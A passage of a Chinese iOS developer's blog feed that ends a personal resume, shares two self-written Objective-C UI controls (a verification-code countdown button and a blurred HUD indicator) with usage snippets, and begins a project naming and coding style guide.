<li><strong>项目简介：</strong>小店宝主要为线下中高端小店做有质量、有品质的推广。Professional端主要为店长提供Offering、单品、发布活动、特卖转场、发布折扣等UGC的生成。并且为店长提供提供小型CRM系统管理客户。</li>
<li><strong>公司简介：</strong>A轮初创公司，做线下购物平台索引，类似于中高端小店的大众点评。目前汇集了上海、北京两个城市在内的8000家店铺。技术团队由前堆糖CTO带领。</li>
<li><strong>公司主页：</strong><a href="www.ushopal.com">www.ushopal.com</a></li>
<li><strong>项目难点：</strong>UGC预览生成功能；线上修改BUG；页面几乎都需要灵活配置，考虑低版本和向后的兼容；兼容iOS7</li>
<li><strong>负责部分：</strong><ul>
<li>『任务提醒』页面UI及逻辑实现</li>
<li>『生意管理』页面的性能优化</li>
<li>『添加生意』页面UI及逻辑实现</li>
<li>生意管理和添加生意多种操作的Scheme跳转实现</li>
<li>『更多』页面UI及逻辑实现</li>
<li>『关于』页面使用自己封装的<a href="https://github.com/summertian4/iOS-CFWaterFlowView" target="_blank" rel="external">CFWaterFlowView</a>实现水波纹效果的APP LOGO</li>
<li>『联系客服』页面UI及逻辑实现</li>
<li>自定义友盟FeedBack页面</li>
<li>BUG监控和JSPatch线上补丁（监控主要使用Fabric和Bugtags）</li>
<li>对TZImagePickerController优化（为了兼容iOS7同时支持iCloud照片选择）</li>
</ul>
</li>
<li><strong>涉及技术：</strong><ul>
<li>MVC开发和MVVM开发</li>
<li>Scheme实现原生和HTML页面的无缝跳转</li>
<li>纯代码UI编写</li>
<li>CDN取图规则适配</li>
<li>JSPatch线上打补丁修复BUG</li>
<li>服务器灵活配置UI</li>
<li>贝塞尔曲线实现水波纹效果</li>
<li>AliyunOSS图片上传封装</li>
</ul>
</li>
</ul>
<h4 id="上海子杰信息技术有限公司——学习城-iOS客户端"><a href="#上海子杰信息技术有限公司——学习城-iOS客户端" class="headerlink" title="上海子杰信息技术有限公司——学习城 iOS客户端"></a>上海子杰信息技术有限公司——学习城 iOS客户端</h4><ul>
<li><strong>项目地址：</strong>很遗憾最终没有上线</li>
<li><strong>项目简介：</strong>学习城是目前市面上功能最全面强大的一款中小学生的考试、作业管理与统计的系统，并附带有步步高教学功能</li>
<li><strong>功能描述：</strong><ul>
<li>对中小学生的作业和考试进行管理，多权限登陆，实现学生做题、教师批改、学生查看批改对比答案</li>
<li>提供中小学书本阅读器，供中小学生阅读、学习</li>
<li>对学生的作业情况、薄弱点情况进行测量主题统计，供给家长、教师查看</li>
<li>提供步步高功能，包括听、读、看、写、四大功能，能够比对标准读音和学生读音进行自动评分，能提供类似“字宝宝”功能教学生写字</li>
</ul>
</li>
<li><strong>项目难点：</strong>页面繁多；特殊功能页繁多；技术难点繁多（包括语音识别对比、字形比对、多客户端功能整合等）</li>
<li><strong>负责部分：</strong><ul>
<li>试卷框架的整体架构设计</li>
<li>试卷框架的Reference文档和API文档</li>
<li>学生答题页面、check页面的整体逻辑与实现</li>
<li>教师批改页面的整体逻辑与实现</li>
<li>服务器试卷html的纠错、分离、抽取与解析</li>
<li>步步高学生识字功能的实现</li>
<li>用C#编写PC客户端切字工具</li>
<li>研究洪泛算法和抠图技术</li>
<li>实现、封装按钮流式布局</li>
<li>实现、封装透明指示层</li>
<li>设计项目编码规范</li>
</ul>
</li>
<li><strong>涉及技术：</strong><ul>
<li>MVC开发模式</li>
<li>AppleDoc编写API文档</li>
<li>storyboard拆分各人工作流</li>
<li>xib自定义复杂页面</li>
<li>使用自己封装的<a href="https://github.com/summertian4/iOS-CFBlurHUD" target="_blank" rel="external">CFBlurHUD</a>实现带虚化效果的透明指示层</li>
<li>使用自己封装的<a href="https://github.com/summertian4/iOS-CFFlowButtonView" target="_blank" rel="external">CFFlowButtonView</a>实现按钮流式布局</li>
<li>Masonry适配横竖屏布局</li>
<li>洪泛算法抠图的研究与实现</li>
<li>Core Graphics实现汉字的笔顺播放、比对书写</li>
<li>GCD多线程操作</li>
<li>原生API进行同步网络连接</li>
<li>使用AFNetworking进行异步网络连接</li>
<li>使用hpple对HTML进行解析</li>
<li>使用FMDB进行数据库连接与管理</li>
<li>使用SDWebImage进行图片缓存</li>
<li>使用MJRefresh进行上拉刷新</li>
<li>使用MJExtension进行Json、object转换与解析</li>
</ul>
</li>
</ul>
<h3 id="服务器开发-企业项目"><a href="#服务器开发-企业项目" class="headerlink" title="服务器开发-企业项目"></a><span style="color:#00aa99">服务器开发-企业项目</span></h3><h4 id="安庆市人民银行-中小微企业信息共享服务平台"><a href="#安庆市人民银行-中小微企业信息共享服务平台" class="headerlink" title="安庆市人民银行 中小微企业信息共享服务平台"></a>安庆市人民银行 中小微企业信息共享服务平台</h4><ul>
<li>负责参与平台整体设计与实现</li>
<li>其它信息由于银行保密条约不便写出，敬请谅解</li>
</ul>
<h4 id="安庆新浪安庆戏曲Android—安庆新浪"><a href="#安庆新浪安庆戏曲Android—安庆新浪" class="headerlink" title="安庆新浪安庆戏曲Android—安庆新浪"></a>安庆新浪安庆戏曲Android—<a href="http://ah.sina.com.cn/anqing/" target="_blank" rel="external">安庆新浪</a></h4><ul>
<li>负责Android后端SSH框架</li>
<li>负责“用户”“文章”“板块”模块的代码实现</li>
</ul>
<h4 id="安博软件公司-B2C网上商城—安博软件公司"><a href="#安博软件公司-B2C网上商城—安博软件公司" class="headerlink" title="安博软件公司 B2C网上商城—安博软件公司"></a>安博软件公司 B2C网上商城—<a href="http://www.ambow.com/" target="_blank" rel="external">安博软件公司</a></h4><ul>
<li>在项目中担任项目组长</li>
<li>负责网站整体架构</li>
<li>负责设计数据库和Struts2+Hibernate框架</li>
<li>重点完成“购物车”“订单”“商品”等重要模块设计并监督其他项目成员代码质量</li>
</ul>
<h3 id="服务器开发-比赛及个人项目"><a href="#服务器开发-比赛及个人项目" class="headerlink" title="服务器开发-比赛及个人项目"></a><span style="color:#00aa99">服务器开发-比赛及个人项目</span></h3><h4 id="物联网智能教室开发"><a href="#物联网智能教室开发" class="headerlink" title="物联网智能教室开发"></a>物联网智能教室开发</h4><ul>
<li>在项目中担任队长</li>
<li>负责系统整体架构</li>
<li>负责系统软件部分，其开发软件包括：打卡智能签到PC端、智能签到管理网站、智能彩虹WIFI、作业布置小助手、教室智能控制安卓客户端、负责系统软硬件的接口规划、负责系统软硬件的对接（通过串口技术将硬件接口与软件对接</li>
</ul>
<h4 id="学生成绩管理系统"><a href="#学生成绩管理系统" class="headerlink" title="学生成绩管理系统"></a>学生成绩管理系统</h4><ul>
<li>实现学生成绩的查询和信息修改</li>
<li>实现教师查询、信息修改和信息统计</li>
</ul>
</blockquote>
<h2 id="培训与实习"><a href="#培训与实习" class="headerlink" title="培训与实习"></a>培训与实习</h2><blockquote>
<ul>
<li>2013.11~2013.12 <a href="http://ah.sina.com.cn/anqing/" target="_blank" rel="external">安庆新浪公司</a></li>
<li>2014.6~2014.8 <a href="http://www.ambow.com/" target="_blank" rel="external">安博软件外包园</a></li>
<li>2014.11~2014.12 <a href="http://humtech.cn.gongchang.com/" target="_blank" rel="external">南京瀚之显电子科技有限公司</a>（硬件培训）</li>
<li>2015.7~2015.8 <a href="http://www.buoyantec.com/" target="_blank" rel="external">大唐电信下属公司大唐邦彦</a></li>
</ul>
</blockquote>
<h2 id="工作经历"><a href="#工作经历" class="headerlink" title="工作经历"></a>工作经历</h2><blockquote>
<ul>
<li>2015.6~2015.11 <a href="http://www.zj-xx.cn/" target="_blank" rel="external">上海子杰信息技术有限公司</a></li>
<li>2015.11~2016.5 <a href="http://www.ushopal.com" target="_blank" rel="external">上海深屹网络科技公司</a></li>
</ul>
</blockquote>
<h2 id="主要获奖经历"><a href="#主要获奖经历" class="headerlink" title="主要获奖经历"></a>主要获奖经历<strong></strong></h2><blockquote>
<ul>
<li><a href="http://iotcompetition.org/" target="_blank" rel="external">第一届全国物联网创新应用大赛特等奖（全国赛）</a></li>
<li><a href="http://iotcompetition.org/" target="_blank" rel="external">第一届全国物联网创新应用大赛一等奖（华东赛区）</a></li>
<li><a href="http://iot.sjtu.edu.cn/" target="_blank" rel="external">TI杯物联网大赛 一等奖（华东赛区）</a></li>
<li><a href="http://61.191.190.39:8001/" target="_blank" rel="external">双百全国科普创意大赛 三等奖</a></li>
<li>电信杯 飞·Young奖获得者</li>
</ul>
</blockquote>
<h2 id="创业经历"><a href="#创业经历" class="headerlink" title="创业经历"></a>创业经历</h2><blockquote>
<ul>
<li>2015年5月与朋友们创立指尖科技工作室，开始开发并推出我们的『掌上校园』app。</li>
<li>2015年6月在本校创业孵化基地落地，因市场需求开始接受外包项目。</li>
<li>2015年7月因本人将在上海进行学院安排的实习，但在两个月期间带领工作室成员成功将工作室运转，并成功交付接下的五个项目。</li>
<li>2015年7月应学校要求在上海大唐电信下属大唐邦彦公司实习，暂时离开工作室。</li>
</ul>
</blockquote>
<h2 id="相关证书"><a href="#相关证书" class="headerlink" title="相关证书"></a>相关证书</h2><blockquote>
<ul>
<li>英语资格证：ＣＥＴ４</li>
<li>软考资格证：软件设计师</li>
</ul>
</blockquote>
<h2 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h2><blockquote>
<ul>
<li>热爱开源，喜欢分享代码到<strong><a href="https://github.com/summertian4" target="_blank" rel="external">github</a></strong></li>
<li>喜爱写<strong><a href="http://zhoulingyu.com">博客</a></strong>分享经验</li>
<li>热爱学习新事物</li>
<li><span style="color:#00aa99"><strong>代码洁癖</strong></span>，书写喜欢用Markdown</li>
<li>对自己<span style="color:#00aa99"><strong>学习能力自信</strong></span></li>
</ul>
</blockquote>
<h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><blockquote>
<ul>
<li>希望贵公司能够收下我这个『技术宅』『萌妹子』^_^</li>
</ul>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简历·周凌宇&quot;&gt;&lt;a href=&quot;#简历·周凌宇&quot; class=&quot;headerlink&quot; title=&quot;简历·周凌宇&quot;&gt;&lt;/a&gt;&lt;center&gt;简历·周凌宇&lt;/center&gt;&lt;/h1&gt;&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;http://7xnrog.c
    
    </summary>
    
      <category term="简历" scheme="http://zhoulingyu.com/categories/%E7%AE%80%E5%8E%86/"/>
    
    
      <category term="resume" scheme="http://zhoulingyu.com/tags/resume/"/>
    
  </entry>
  
  <entry>
    <title>iOS——分享自己封装的验证码按钮控件CFSecurityCodeButton</title>
    <link href="http://zhoulingyu.com/2015/11/10/iOS%E2%80%94%E2%80%94%E5%88%86%E4%BA%AB%E8%87%AA%E5%B7%B1%E5%B0%81%E8%A3%85%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E6%8C%89%E9%92%AE%E6%8E%A7%E4%BB%B6CFSecurityCodeButton/"/>
    <id>http://zhoulingyu.com/2015/11/10/iOS——分享自己封装的验证码按钮控件CFSecurityCodeButton/</id>
    <published>2015-11-10T07:07:27.000Z</published>
    <updated>2016-08-05T06:23:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CFSecurityCodeButton"><a href="#CFSecurityCodeButton" class="headerlink" title="CFSecurityCodeButton"></a>CFSecurityCodeButton</h1><p>写了一个验证码按钮的控件，简约好用，希望大家喜欢。</p>
<p>github地址：<a href="https://github.com/summertian4/iOS-CFSecurityCodeButton" target="_blank" rel="external">https://github.com/summertian4/iOS-CFSecurityCodeButton</a></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>CFSecurityCodeButton是一个简约的验证码按钮。<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/github_iOS-CFSecurityCodeButton-show.gif" alt="CFSecurityCodeButton演示"></p>
<a id="more"></a>
<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ol>
<li>自定义Normal状态下文字和Disabled状态下文字</li>
<li>自动根据Normal和Disabled状态下文字设置宽高</li>
<li>自定义定时时间</li>
<li>自动根据按钮的主题色调整文字颜色</li>
<li>提供了代理方法监控按钮开始计时和计时结束</li>
<li>提供了一些好看的颜色供使用者选择</li>
</ol>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>将CFSecurityCodeButton.h、CFSecurityCodeButton.m拖入你的项目中</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><ol>
<li><p>创建<br> 通过主题色创建一个CFSecurityCodeButton</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">CFSecurityCodeButton</span> *btSecurityCode_Blue = [[<span class="built_in">CFSecurityCodeButton</span> alloc] initWithColor:<span class="built_in">CFColorDodgerBlue</span>];</div></pre></td></tr></table></figure>
<p> 提供了一些颜色供使用者选择</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">CFColorCoral</div><div class="line">CFColorDodgerBlue</div><div class="line">CFColorDeepSkyBlue</div><div class="line">CFColorTurquoise</div><div class="line">CFColorWarmYellow</div><div class="line">CFColorMediumPurple</div><div class="line">CFColorSeaGreen</div></pre></td></tr></table></figure>
</li>
<li><p>设置文字<br> 如果没有设置，默认Normal状态会显示”发送验证码”，Disabled状态会显示”再次发送(倒计时)”<br> 如果需要自定义可以设置<code>normalTitle</code>和<code>disabledTitle</code>属性</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">btSecurityCode.normalTitle = <span class="string">@"自定义normal状态文字内容"</span>;</div><div class="line">btSecurityCode.disabledTitle = <span class="string">@"自定义disabled状态文字内容"</span>;</div></pre></td></tr></table></figure>
<p> <img src="http://7xnrog.com1.z0.glb.clouddn.com/github_iOS-CFSecurityCodeButton-02.png" alt="CFSecurityCodeButton演示"></p>
</li>
<li><p>设置倒计时<br> 如果没有设置，默认倒计时为60秒<br> 如果需要自定义可以设置<code>time</code>属性</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">btSecurityCode.time = <span class="number">60</span>;</div></pre></td></tr></table></figure>
</li>
<li><p>自动调节文字颜色<br> CFSecurityCodeButton会根据自身的颜色调节文字颜色，当颜色过深时文字将会变成白色，当颜色过浅时文字颜色将会变成黑色<br> <img src="http://7xnrog.com1.z0.glb.clouddn.com/github_iOS-CFSecurityCodeButton-03.png" alt="CFSecurityCodeButton演示"></p>
</li>
<li><p>代理<br> 提供了两个代理方法监控按钮</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">	<span class="comment">/**</span></div><div class="line">	 *  按钮被点击</div><div class="line">	 *</div><div class="line">	 *  @param securityCodeButton CFSecurityCodeButton对象</div><div class="line">	 */</div><div class="line">	- (<span class="keyword">void</span>)securityCodeButtonDidClicked:(<span class="built_in">CFSecurityCodeButton</span> *)securityCodeButton;</div><div class="line"><span class="comment">/**</span></div><div class="line">	 *  按钮倒计时结束</div><div class="line">	 *</div><div class="line">	 *  @param securityCodeButton CFSecurityCodeButton对象</div><div class="line">	 */</div><div class="line">	- (<span class="keyword">void</span>)securityCodeButtonTimingEnded:(<span class="built_in">CFSecurityCodeButton</span> *)securityCodeButton;</div></pre></td></tr></table></figure>
<p> 只需要实现<code>CFSecurityCodeButtonDelegate</code>，重写代理方法</p>
</li>
</ol>
<h1 id="反馈"><a href="#反馈" class="headerlink" title="反馈"></a>反馈</h1><p>如果有什么修改建议，可以发送邮件到coderfish@163.com，也欢迎到<a href="http://zhoulingyu.com">我的博客</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#99;&#x6f;&#100;&#x65;&#114;&#x66;&#x69;&#115;&#x68;&#64;&#x31;&#x36;&#51;&#x2e;&#x63;&#111;&#x6d;">&#99;&#x6f;&#100;&#x65;&#114;&#x66;&#x69;&#115;&#x68;&#64;&#x31;&#x36;&#51;&#x2e;&#x63;&#111;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CFSecurityCodeButton&quot;&gt;&lt;a href=&quot;#CFSecurityCodeButton&quot; class=&quot;headerlink&quot; title=&quot;CFSecurityCodeButton&quot;&gt;&lt;/a&gt;CFSecurityCodeButton&lt;/h1&gt;&lt;p&gt;写了一个验证码按钮的控件，简约好用，希望大家喜欢。&lt;/p&gt;
&lt;p&gt;github地址：&lt;a href=&quot;https://github.com/summertian4/iOS-CFSecurityCodeButton&quot;&gt;https://github.com/summertian4/iOS-CFSecurityCodeButton&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;CFSecurityCodeButton是一个简约的验证码按钮。&lt;br&gt;&lt;img src=&quot;http://7xnrog.com1.z0.glb.clouddn.com/github_iOS-CFSecurityCodeButton-show.gif&quot; alt=&quot;CFSecurityCodeButton演示&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS——分享自己封装的指示器CFHUD</title>
    <link href="http://zhoulingyu.com/2015/11/08/iOS%E2%80%94%E2%80%94%E5%88%86%E4%BA%AB%E8%87%AA%E5%B7%B1%E5%B0%81%E8%A3%85%E7%9A%84%E6%8C%87%E7%A4%BA%E5%99%A8CFHUD/"/>
    <id>http://zhoulingyu.com/2015/11/08/iOS——分享自己封装的指示器CFHUD/</id>
    <published>2015-11-08T10:12:27.000Z</published>
    <updated>2016-08-05T06:23:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CFHUD"><a href="#CFHUD" class="headerlink" title="CFHUD"></a>CFHUD</h1><p>这几天自己写了一个HUD，感觉挺漂亮的，有虚化效果，传到了github上给大家分享。<br><a href="https://github.com/summertian4/iOS-CFBlurHUD" target="_blank" rel="external">GitHub链接</a>：<a href="https://github.com/summertian4/iOS-CFBlurHUD" target="_blank" rel="external">https://github.com/summertian4/iOS-CFBlurHUD</a></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>CFBlurHUD是基于UIVisualEffectView实现的指示器，拥有虚化模糊效果。</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/github_iOS-CFBlurHUD-show.gif" alt="CFBlurHUD效果演示"></p>
<a id="more"></a>
<h1 id="支持"><a href="#支持" class="headerlink" title="支持"></a>支持</h1><p>最低支持版本：iOS 8</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>将CFBlurHUD下的所有内容拖入你的项目中</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>普通Loading指示器</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="built_in">CFBlurHUD</span> show:<span class="string">@"你的信息"</span>];</div></pre></td></tr></table></figure>
<p>成功指示器</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="built_in">CFBlurHUD</span> showSuccess:<span class="string">@"成功"</span>];</div></pre></td></tr></table></figure>
<p>失败指示器</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="built_in">CFBlurHUD</span> showFaild:<span class="string">@"错误"</span>];</div></pre></td></tr></table></figure>
<p>如果你不希望显示信息，参数可以填入nil或者@””</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[<span class="built_in">CFBlurHUD</span> show:<span class="string">@""</span>];</div><div class="line">[<span class="built_in">CFBlurHUD</span> showSuccess:<span class="string">@""</span>];</div><div class="line">[<span class="built_in">CFBlurHUD</span> showFaild:<span class="string">@""</span>];</div></pre></td></tr></table></figure>
<h1 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h1><p>如果你不喜欢CFBlurHUD的颜色，可以在CFBlurHUD.m的宏定义部分更改参数。</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#define CFBlurHUDBorderColor [UIColor colorWithRed:98/255.0 green:98/255.0 blue:98/255.0 alpha:0.5]</span></div><div class="line"><span class="meta">#define CFBlurHUDMessageColor [UIColor colorWithRed:110/255.0 green:110/255.0 blue:110/255.0 alpha:1]</span></div><div class="line"><span class="meta">#define CFBlurHUDActivityIndicatorColor [UIColor colorWithRed:142/255.0 green:155/255.0 blue:236/255.0 alpha:1]</span></div></pre></td></tr></table></figure>
<h1 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h1><p>如果你有需要更改CFBlurHUD的代码，请尽量不要更改CFBlurHUD的边框。因为UIVisualEffectView的Light样式在背景是白色情况下会难以被看见。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#99;&#x6f;&#x64;&#101;&#x72;&#102;&#105;&#x73;&#104;&#64;&#49;&#x36;&#51;&#46;&#99;&#111;&#109;">&#99;&#x6f;&#x64;&#101;&#x72;&#102;&#105;&#x73;&#104;&#64;&#49;&#x36;&#51;&#46;&#99;&#111;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CFHUD&quot;&gt;&lt;a href=&quot;#CFHUD&quot; class=&quot;headerlink&quot; title=&quot;CFHUD&quot;&gt;&lt;/a&gt;CFHUD&lt;/h1&gt;&lt;p&gt;这几天自己写了一个HUD，感觉挺漂亮的，有虚化效果，传到了github上给大家分享。&lt;br&gt;&lt;a href=&quot;https://github.com/summertian4/iOS-CFBlurHUD&quot;&gt;GitHub链接&lt;/a&gt;：&lt;a href=&quot;https://github.com/summertian4/iOS-CFBlurHUD&quot;&gt;https://github.com/summertian4/iOS-CFBlurHUD&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;CFBlurHUD是基于UIVisualEffectView实现的指示器，拥有虚化模糊效果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xnrog.com1.z0.glb.clouddn.com/github_iOS-CFBlurHUD-show.gif&quot; alt=&quot;CFBlurHUD效果演示&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS命名与编码规范文档</title>
    <link href="http://zhoulingyu.com/2015/11/03/iOS%E5%91%BD%E5%90%8D%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3/"/>
    <id>http://zhoulingyu.com/2015/11/03/iOS命名与编码规范文档/</id>
    <published>2015-11-03T05:30:00.000Z</published>
    <updated>2016-08-04T09:58:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>项目经理的要求，给成员写一份简单的命名和编码规范，因为成员很多都是新人，甚至还有刚开始接触规范编码的，所以我就写了一份简单的。</p>
<p>还有很多不完善的地方，而且只是针对这次项目的，只是给一个参考。</p>
<hr>
<h1 id="XXXiOS项目-命名及编码规范"><a href="#XXXiOS项目-命名及编码规范" class="headerlink" title="XXXiOS项目-命名及编码规范"></a>XXXiOS项目-命名及编码规范</h1><p>2015年11月3日星期二<br>周凌宇</p>
<p><br></p>
<h2 id="1-类"><a href="#1-类" class="headerlink" title="1 类"></a><strong>1 类</strong></h2><p>1.1    遵守大驼峰命名法<br>1.2    Controller命名：<br>&nbsp;&nbsp;&nbsp;&nbsp;1.1.1    ViewController子类命名规范：XXXController</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E5%91%BD%E5%90%8D%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3001.png" alt="ViewController子类命名规范"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;1.1.2    TableViewController子类命名规范：XXXTableController<br>&nbsp;&nbsp;&nbsp;&nbsp;1.1.3    其他Controller命名规范：与ViewController子类命名规范相同</p>
<p>1.1    View命名：<br>&nbsp;&nbsp;&nbsp;&nbsp;1.1.1    View子类命名规范：XXXView<br>&nbsp;&nbsp;&nbsp;&nbsp;1.1.2    View的Xib与相应的类同名</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E5%91%BD%E5%90%8D%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3002.png" alt="View的Xib与相应的类同名"></p>
<p><br></p>
<h2 id="2-协议"><a href="#2-协议" class="headerlink" title="2    协议"></a><strong>2    协议</strong></h2><p>2.1    遵守大驼峰命名法<br>2.2    代理：<br>&nbsp;&nbsp;&nbsp;&nbsp;2.2.1    代理写在相应类型的.h文件中，不需要单独建立文件<br>&nbsp;&nbsp;&nbsp;&nbsp;2.2.2    命名规范：XXXDelegate，XXX和相应类名一致</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E5%91%BD%E5%90%8D%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3003.png" alt="代理命名规范"></p>
<p><br></p>
<h2 id="3-宏定义"><a href="#3-宏定义" class="headerlink" title="3 宏定义"></a><strong>3 宏定义</strong></h2><p>3.1    避免在程序中直接出现常数，常数宏定义变量全部大写<br>3.2    使用超过一次的小段代码应以宏定义的形式来替代，遵循大驼峰命名法<br>3.3    常量的命名应当能够表达出它的用途</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E5%91%BD%E5%90%8D%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3004.png" alt="宏定义示例"></p>
<p><br></p>
<h2 id="4-枚举"><a href="#4-枚举" class="headerlink" title="4 枚举"></a><strong>4 枚举</strong></h2><p>4.1    遵循大驼峰命名法<br>4.2    枚举写在相应的.h文件中，不需要单独建立文件<br>4.3    枚举中的变量以枚举名开头，如：ExamPaperType枚举中包含的变量是ExamPaperTypeExam、ExamPaperTypeCheck、ExamPaperTypeGrade</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E5%91%BD%E5%90%8D%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3005.png" alt="枚举命名规范"></p>
<p><br></p>
<h2 id="5-方法"><a href="#5-方法" class="headerlink" title="5 方法"></a><strong>5 方法</strong></h2><p>5.1    遵循小驼峰命名法<br>5.2    方法的名称应全部使用有意义的单词组成<br>5.3    set、get方法：<br>&nbsp;&nbsp;&nbsp;&nbsp;5.3.1    set方法命名规范: <code>- (void)setUUID:(NSString *)UUID</code><br>&nbsp;&nbsp;&nbsp;&nbsp;5.3.2    get方法命名规范：<code>- (NSString *)UUID</code><br>5.4    init方法：<br>&nbsp;&nbsp;&nbsp;&nbsp;5.4.1    必须在<code>if (self = [super init]) {}</code> 中做初始化操作<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E5%91%BD%E5%90%8D%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3006.png" alt="init方法"></p>
<p><br></p>
<h2 id="6-变量"><a href="#6-变量" class="headerlink" title="6 变量"></a><strong>6 变量</strong></h2><p>6.1    遵循小驼峰命名法<br>6.2    变量必须起有意义的名字<br>6.3    NSString类型属性：参数必须为(nonatomic, copy)<br>6.4    NSArray/NSMutableArray类型变量：变量名可以使用加后缀s或Array</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E5%91%BD%E5%90%8D%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3007.png" alt="NSArray/NSMutableArray类型变量"></p>
